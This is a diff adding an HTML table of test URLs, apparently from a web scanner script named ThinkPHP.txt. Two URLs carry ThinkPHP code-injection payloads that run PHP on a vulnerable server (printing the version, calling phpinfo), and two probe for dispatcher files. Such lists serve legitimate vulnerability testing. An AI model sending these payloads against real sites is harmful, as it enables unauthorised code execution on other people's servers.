@@ -1,0 +1,27 @@
+<table border="1">
+  <tr>
+    <th>ID</th>
+    <th>测试页面</th>
+    <th>来自脚本</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>http://www.aa.com/module/aciton/param1/${@print(THINK_VERSION)}index.php/module/aciton/param1/${@function_all()}</td>
+    <td>ThinkPHP.txt</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>http://www.aa.com/Module/Action/Param/${@phpinfo()}</td>
+    <td>ThinkPHP.txt</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>http://www.aa.com/ThinkPHP/Lib/Core/Dispatcher.class.php</td>
+    <td>ThinkPHP.txt</td>
+  </tr>
+  <tr>
+    <td>4</td>
+    <td>http://www.aa.com/ThinkPHP/Lib/Think/Util/Dispatcher.class.php</td>
+    <td>ThinkPHP.txt</td>
+  </tr>
+</table>
